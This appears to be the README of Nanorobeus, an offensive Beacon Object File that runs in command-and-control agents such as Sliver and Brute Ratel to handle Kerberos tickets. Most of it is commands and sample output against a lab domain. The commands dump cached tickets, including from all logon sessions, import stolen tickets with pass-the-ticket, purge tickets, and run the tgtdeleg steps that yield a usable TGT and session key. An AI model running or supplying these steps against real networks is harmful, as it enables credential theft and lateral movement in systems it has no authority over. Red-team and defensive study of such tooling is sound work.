# Nanorobeus
COFF file (BOF) for managing Kerberos tickets.

## Supported agents
* [Sliver](https://github.com/BishopFox/sliver)
* [Brute Ratel](https://bruteratel.com)
* Any other agent supporting Cobalt Strike BOFs (not tested)

## Commands

**luid** - get current logon ID

**sessions** *[/luid <0x0>| /all]* - get logon sessions

**klist** *[/luid <0x0> | /all]* - list Kerberos tickets

**dump** *[/luid <0x0> | /all]* - dump Kerberos tickets

**ptt** *\<base64\> [/luid <0x0>]* - import Kerberos ticket into a logon session

**purge** *[/luid <0x0>]* - purge Kerberos tickets

**tgtdeleg** *\<spn\> [\<enc_type_hex\>]* - retrieve a usable TGT for the current user

## Examples
Get current logon ID.
```
=> nanorobeus64 luid

[+] Current LogonId: 0:0x19ea88e
```
Get detailed information about the current logon session.
```
=> nanorobeus64 sessions

UserName                : User
Domain                  : FORTRESS
LogonId                 : 0:0x19ea88e
Session                 : 2
UserSID                 : S-1-5-21-1768674056-2740991423-664180583-1105
Authentication package  : Kerberos
LogonType               : Interactive
LogonTime (UTC)         : 2/7/2022 19:22:43
LogonServer             : SERVER
LogonServerDNSDomain    : FORTRESS.LOCAL
UserPrincipalName       : user@fortress.local
```
List Kerberos tickets for the current logon session. When elevated, use `/all` to list tickets from all of the sessions or `/luid 0x0` to list tickets in a specified logon session.
```
=> nanorobeus64 klist

UserName                : User
Domain                  : FORTRESS
LogonId                 : 0:0x19ea88e
Session                 : 2
UserSID                 : S-1-5-21-1768674056-2740991423-664180583-1105
Authentication package  : Kerberos
LogonType               : Interactive
LogonTime (UTC)         : 2/7/2022 19:22:43
LogonServer             : SERVER
LogonServerDNSDomain    : FORTRESS.LOCAL
UserPrincipalName       : user@fortress.local

[*] Cached tickets: (6)

	[0]
	Client name     : User @ FORTRESS.LOCAL
	Server name     : krbtgt/FORTRESS.LOCAL @ FORTRESS.LOCAL
	Start time      : 2/7/2022 19:22:44 (UTC)
	End time        : 3/7/2022 5:22:43 (UTC)
	Renew time      : 9/7/2022 19:22:43 (UTC)
	Flags           : forwardable, forwarded, renewable, pre_authent, name_canonicalize (0x60a10000)
	Encryption type : AES256_CTS_HMAC_SHA1
    ...(snip)...
```
Dump tickets from the current logon session. When elevated, use `/all` to dump tickets from all of the sessions or `/luid 0x0` to dump tickets from a specified logon session.
```
=> nanorobeus64 dump

UserName                : User
Domain                  : FORTRESS
LogonId                 : 0:0x19ea88e
Session                 : 2
UserSID                 : S-1-5-21-1768674056-2740991423-664180583-1105
Authentication package  : Kerberos
LogonType               : Interactive
LogonTime (UTC)         : 2/7/2022 19:22:43
LogonServer             : SERVER
LogonServerDNSDomain    : FORTRESS.LOCAL
UserPrincipalName       : user@fortress.local

[*] Cached tickets: (6)

	[0]
	Client name     : User @ FORTRESS.LOCAL
	Server name     : krbtgt/FORTRESS.LOCAL @ FORTRESS.LOCAL
	Start time      : 2/7/2022 19:22:44 (UTC)
	End time        : 3/7/2022 5:22:43 (UTC)
	Renew time      : 9/7/2022 19:22:43 (UTC)
	Flags           : forwardable, forwarded, renewable, pre_authent, name_canonicalize (0x60a10000)
	Encryption type : AES256_CTS_HMAC_SHA1
	Ticket          : doIFFjCCBRKgAwIBBaEDAgEWooIEGTCCBBVhggQRMIIEDaADAg...(snip)...
```
Import a ticket into the current logon session. When elevated, use `/luid 0x0` to import the ticket into a specified logon session.
```
=> make_token network fortress.local test pass
=> nanorobeus64 ptt doIFqjCCBaagAwIB...snip...

[+] Ticket successfully imported.
```
Purge all Kerberos tickets from the current logon session. When elevated, use `/luid 0x0` to purge the tickets from a specified logon session.
```
=> nanorobeus64 purge

[+] Successfully purged tickets.
```
Retrieve a usable TGT for the current user. First, retrieve AP-REQ blob.
```
=> nanorobeus64 tgtdeleg cifs/dc.fortress.local

[+] AP-REQ blob: YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)...
```
Then determine an encryption type.
```
$ TgtDeleg.exe YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)...
[*] Authenticator etype: 0x12 (aes256_cts_hmac_sha1)
```
Retrieve a session key.
```
=> nanorobeus64 tgtdeleg cifs/dc.fortress.local 0x12

[*] Encryption: AES256_CTS_HMAC_SHA1
[+] Session key: 1/0kOhaO+7bRVPUABp0q4IFazZDc2l3GOcWYTuL/bDk=
```
Finally, specify the session key and retrieve a usable TGT ticket.
```
$ TgtDeleg.exe YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)... 1/0kOhaO+7bRVPUABp0q4IFazZDc2l3GOcWYTuL/bDk=
[*] Authenticator etype: 0x12 (aes256_cts_hmac_sha1)
[*] Ticket: doIFeDCCBXSgAwIBBaEDAgEWooIEcjCCBG5hggRqMIIEZq...(snip)...
```

## Credits
* Rubeus - https://github.com/GhostPack/Rubeus
* mimikatz - https://github.com/gentilkiwi/mimikatz